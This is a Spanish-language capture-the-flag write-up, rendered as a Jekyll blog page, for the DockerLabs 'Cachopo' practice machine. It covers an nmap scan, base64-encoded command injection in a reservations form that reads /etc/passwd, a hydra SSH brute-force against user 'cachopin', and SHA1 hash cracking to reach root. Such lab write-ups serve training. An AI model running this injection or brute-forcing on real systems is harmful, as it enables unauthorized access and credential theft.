@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=5fdc73dbc748710b5d954669c64acfd639531df9">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Cachopo | Mi Sitio Hacker</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Cachopo" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Un sitio con estilo hacker para pentesting y labs." />
+<meta property="og:description" content="Un sitio con estilo hacker para pentesting y labs." />
+<link rel="canonical" href="http://localhost:4000/2024/11/30/cachopo.html" />
+<meta property="og:url" content="http://localhost:4000/2024/11/30/cachopo.html" />
+<meta property="og:site_name" content="Mi Sitio Hacker" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-11-30T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Cachopo" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-11-30T00:00:00-05:00","datePublished":"2024-11-30T00:00:00-05:00","description":"Un sitio con estilo hacker para pentesting y labs.","headline":"Cachopo","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2024/11/30/cachopo.html"},"url":"http://localhost:4000/2024/11/30/cachopo.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Mi Sitio Hacker</h1>
+        </a>
+        <h2>Un sitio con estilo hacker para pentesting y labs.</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/kamilfire/kamilfire.github.io" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>30 November 2024</small>
+<h1>Cachopo</h1>
+
+<p class="view">by </p>
+
+
+<p>Nmap</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --open -sSCV --min-rate 5000 -vvv -Pn 172.17.0.2 -oN nmap.txt
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 7b:98:d4:e7:ec:50:0b:b2:3a:21:76:2c:45:95:23:61 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEjW7OFr3vBvcqYorxu8cbiAsLnl1KxEId5AjI88T+pHcpP1tlFZROjtLlMTl6/qbg3SvyDoh75cLiLq/nG5d1U=
+|   256 5d:15:2b:28:ec:67:7e:78:3c:16:12:65:2f:59:d4:88 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiE4JB9YEGU2mtWJP7VMmr5R60+RXwvThaYJ//r0T9h
+80/tcp open  http    syn-ack ttl 64 Werkzeug/3.0.3 Python/3.12.3
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD
+|_http-title: Cahopos4-4ll
+|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/3.0.3 Python/3.12.3
+|     Date: Thu, 22 Aug 2024 16:23:50 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 9332
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="UTF-8"&gt;
+|     &lt;meta name="viewport" content="width=device-width initial-scale=1.0"&gt;
+|     &lt;link rel="stylesheet" href="/static/css/style.css"&gt;
+|     &lt;title&gt;Cahopos4-4ll&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;header&gt;
+|     &lt;nav&gt;
+|     &lt;h2&gt;&lt;a href="/" id="logo"&gt;DockerLabs&lt;/a&gt;&lt;/h2&gt;
+|     &lt;button class="nav-button fa fa-bars"&gt;&lt;/button&gt;
+|     &lt;div&gt;
+|     &lt;!-- &lt;ul&gt; --&gt;
+|     &lt;ul&gt;
+|     &lt;button class="exit-menu fa fa-times"&gt;&lt;/button&gt;
+|     &lt;li&gt;&lt;a href="#" class="active"&gt;welcome&lt;/a&gt;&lt;/li&gt;
+|     &lt;li&gt;&lt;a href="#"&gt;menu&lt;/a&gt;&lt;/li&gt;
+|     &lt;li&gt;&lt;a href="#"&gt;reservations&lt;/a&gt;&lt;/li&gt;
+|     &lt;li&gt;&lt;a href="#"&gt;news&lt;/a&gt;&lt;/li&gt;
+|     &lt;li&gt;&lt;a href="#"&gt;contact&lt;/a&gt;&lt;/li&gt;
+|     &lt;/ul&gt;
+|     &lt;!-- &lt;/ul&gt; --&gt;
+|     &lt;/div&gt;
+|     &lt;/nav&gt;
+|     &lt;div cl
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/3.0.3 Python/3.12.3
+|     Date: Thu, 22 Aug 2024 16:23:50 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Allow: OPTIONS, GET, HEAD
+|     Content-Length: 0
+|     Connection: close
+|   RTSPRequest: 
+|     &lt;!DOCTYPE HTML&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.94SVN%I=7%D=8/22%Time=66C76616%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,2523,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\x
+SF:20Python/3\.12\.3\r\nDate:\x20Thu,\x2022\x20Aug\x202024\x2016:23:50\x20
+SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
+SF:x209332\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n\x20
+SF:\x20&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\"UTF-8\"&gt;\n\x20\x20\x20\x
+SF:20&lt;meta\x20name=\"viewport\"\x20content=\"width=device-width\x20initial
+SF:-scale=1\.0\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"/
+SF:static/css/style\.css\"&gt;\n\x20\x20\x20\x20&lt;title&gt;Cahopos4-4ll&lt;/title&gt;\n
+SF:\x20\x20&lt;/head&gt;\n&lt;header&gt;\n\x20\x20&lt;nav&gt;\n\x20\x20\x20\x20&lt;h2&gt;&lt;a\x20hre
+SF:f=\"/\"\x20id=\"logo\"&gt;DockerLabs&lt;/a&gt;&lt;/h2&gt;\n\x20\x20\x20\x20&lt;button\x20
+SF:class=\"nav-button\x20fa\x20fa-bars\"&gt;&lt;/button&gt;\n\x20\x20\x20\x20&lt;div&gt;\
+SF:n&lt;!--\x20\x20\x20\x20\x20&lt;ul&gt;\x20--&gt;\n\x20\x20\x20\x20\x20\x20&lt;ul&gt;\n\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20&lt;button\x20class=\"exit-menu\x20fa\x20fa-t
+SF:imes\"&gt;&lt;/button&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;li&gt;&lt;a\x20href=\"#\"\
+SF:x20class=\"active\"&gt;welcome&lt;/a&gt;&lt;/li&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;
+SF:li&gt;&lt;a\x20href=\"#\"&gt;menu&lt;/a&gt;&lt;/li&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;li&gt;
+SF:&lt;a\x20href=\"#\"&gt;reservations&lt;/a&gt;&lt;/li&gt;\n\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0&lt;li&gt;&lt;a\x20href=\"#\"&gt;news&lt;/a&gt;&lt;/li&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;l
+SF:i&gt;&lt;a\x20href=\"#\"&gt;contact&lt;/a&gt;&lt;/li&gt;\n\x20\x20\x20\x20\x20\x20&lt;/ul&gt;\n&lt;!-
+SF:-\x20\x20\x20\x20\x20&lt;/ul&gt;\x20--&gt;\n\x20\x20\x20\x20&lt;/div&gt;\n\x20\x20&lt;/na
+SF:v&gt;\n\x20\x20&lt;div\x20cl")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\nSe
+SF:rver:\x20Werkzeug/3\.0\.3\x20Python/3\.12\.3\r\nDate:\x20Thu,\x2022\x20
+SF:Aug\x202024\x2016:23:50\x20GMT\r\nContent-Type:\x20text/html;\x20charse
+SF:t=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\x20HEAD\r\nContent-Length:\x200\r
+SF:\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,16C,"&lt;!DOCTYPE\x20HTML&gt;\
+SF:n&lt;html\x20lang=\"en\"&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20&lt;meta\x20charset=\"utf-8\"&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;
+SF:title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\
+SF:x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n
+SF:\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\
+SF:x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20version\x20\('R
+SF:TSP/1\.0'\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20
+SF:explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupport
+SF:ed\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n");
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Web</p>
+
+<p>No hay más directorios, es una única página.</p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252FKjUCgIeO2PO4CM3le6Fk%252Fspaces_ahcNR6VKhCehPgx4pP6z_uploads_GUCxVqH0z4dAsBRAOtnu_image.webp%3Falt%3Dmedia%26token%3D3d63063c-cc0b-4fc6-a2aa-74d92cf9ac2e&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=91227e65&amp;sv=1" alt="" /></p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252FGGn6tgW2Bc4C3kY6phYp%252Fspaces_ahcNR6VKhCehPgx4pP6z_uploads_JtUz9ROz6H3cPCuHLMTi_image.webp%3Falt%3Dmedia%26token%3D600f7e50-b060-4efc-aa2f-9f47831d68d3&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=2b6af827&amp;sv=1" alt="" /></p>
+
+<p>En esta pagina no nos dice nada muy relevante, lo único útil que tenemos en un panel de reservas, vamos a ver que es lo que manda.</p>
+
+<p>Burpsuite</p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252Fb4SQJs8k7Iwd101VvqPN%252Fimage.png%3Falt%3Dmedia%26token%3D0a8fbab4-a5f9-4693-bd49-6f1069681f1b&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=2c338cf0&amp;sv=1" alt="" /></p>
+
+<p>Nos da un error, por lo que probamos a convertir esta misma palabra a base64</p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252Fgc8rKf41XLnI6crH2dHQ%252Fspaces_ahcNR6VKhCehPgx4pP6z_uploads_rA8CHjfbK4eq7coOQ8Fj_image.webp%3Falt%3Dmedia%26token%3D182045cb-9535-49ac-a0be-d234386fa364&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=feb7cda1&amp;sv=1" alt="" /></p>
+
+<p>Ahora el error ha cambiado, probemos a ejecutar algún comando de shell codificado en base64</p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252FPGdmBBvSQKN2MhORNhSj%252Fspaces_ahcNR6VKhCehPgx4pP6z_uploads_B0msQb9gcxsP7cKrMbc2_image.webp%3Falt%3Dmedia%26token%3Dcf44d4b3-9875-4fdf-a6fd-4f0af0ef2ab2&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=805c4403&amp;sv=1" alt="" /></p>
+
+<p>El comando es: cat /etc/passwd</p>
+
+<p>Ahora tenemos el usuario <code class="language-plaintext highlighter-rouge">cachopin</code>, por lo que podemos probar a hacer un ataque de fuerza bruta con hydra.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l cachopin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 64
+</code></pre></div></div>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252FvVzlfUASDYprdMikQa2c%252Fspaces_ahcNR6VKhCehPgx4pP6z_uploads_ZCxjSI3ejWsyu79sQHaP_image.webp%3Falt%3Dmedia%26token%3D27b5ce39-2c86-4542-bc9c-d0c55a25d0e7&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=d27cfb38&amp;sv=1" alt="" /></p>
+
+<p>Escalado de privilegios</p>
+
+<p>Miramos permisos de este usuario</p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252FZWe5ZhUyeUPUXkfUonVB%252Fimage.png%3Falt%3Dmedia%26token%3Dfb5def66-71e4-4012-86d0-205a83a7117b&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=64dcb2d5&amp;sv=1" alt="" /></p>
+
+<p>Miramos que tiene esta maquina dentro</p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252FD1b4tIIFZVrJ2X3Avj6f%252Fimage.png%3Falt%3Dmedia%26token%3D7ae74eec-832b-491c-84d4-2640963d2363&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=7185a370&amp;sv=1" alt="" /></p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252FEPVqimWWuTzucKt7tU74%252Fimage.png%3Falt%3Dmedia%26token%3D11f11e84-5e17-4bfb-a119-ca1b5470cef4&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=659faeeb&amp;sv=1" alt="" /></p>
+
+<p>Si seguimos mirando daremos con una lista de hashes generados en SHA1</p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252FELhwwQqyO7s3cMuVYiSc%252Fimage.png%3Falt%3Dmedia%26token%3Dfcd0d5bb-ae87-4968-86e7-dc66de79a020&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=c5e2bc56&amp;sv=1" alt="" /></p>
+
+<p>Parece que estos hashes están modificados en base64, si le preguntamos a ChatGPT no dice:</p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252F9sDOUIOg3SQDKB72rmee%252Fspaces_ahcNR6VKhCehPgx4pP6z_uploads_wen1hQtavE4a08uHykC3_image.webp%3Falt%3Dmedia%26token%3Dbb6e2ebe-5cd8-427b-b0b8-ca4cae480424&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=15adc2ac&amp;sv=1" alt="" /></p>
+
+<p>Tras hacer varias pruebas con estos hashes no saco nada por lo que sigo buscando pero imposible, la única forma de descifrar estos hashes es con la herramienta del creador de la maquina <a href="https://github.com/PatxaSec/SHA_Decrypt">@PatxaSec</a></p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252Fsh0LDtFWRjZaC8E682L9%252Fimage.png%3Falt%3Dmedia%26token%3Da8d1effd-7f7f-493a-9c35-9dfda8e420fe&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=ba5d25f6&amp;sv=1" alt="" /></p>
+
+<p>Si usamos esta herramienta sacaremos 2 posibles contraseñas</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 /opt/SHA_Decrypt/sha2text.py 'd' '$SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=' '/usr/share/w
+</code></pre></div></div>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252FWVz5RE9Y1PWtPL9wIQYe%252Fspaces_ahcNR6VKhCehPgx4pP6z_uploads_hcCceDKMwvGhgxWJrILN_image.webp%3Falt%3Dmedia%26token%3Df3013d5d-2ed3-48b1-b9a2-7449da216e52&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=c7a74f7d&amp;sv=1" alt="" /></p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252FQzOy5C8JTuwV9qALLlpa%252Fspaces_ahcNR6VKhCehPgx4pP6z_uploads_XTvMxVP41nFKyRlDmmVR_image.webp%3Falt%3Dmedia%26token%3De2a30a6d-3c09-4bb1-9a9c-d3741f8d3475&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=64ad2097&amp;sv=1" alt="" /></p>
+
+<p>Si las probamos en el usuario de root una de ellas sera la buena y ya seremos root</p>
+
+<p><img src="https://hacking-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F2700507804-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FXLTbJaeg92PRVBDD3bHb%252Fuploads%252Fz1CqwnK8LGcaW4CDVHCG%252Fspaces_ahcNR6VKhCehPgx4pP6z_uploads_BF8EH3BdjJxECHF3dwE4_image.webp%3Falt%3Dmedia%26token%3Df5aadc28-aa87-4e72-8c5d-b24e28ac2e0e&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=8dccd2a7&amp;sv=1" alt="" /></p>
+
+
+
+  <small>tags: <em></em></small>
+
+
+      </section>
+    </div>
+  </body>
+</html>
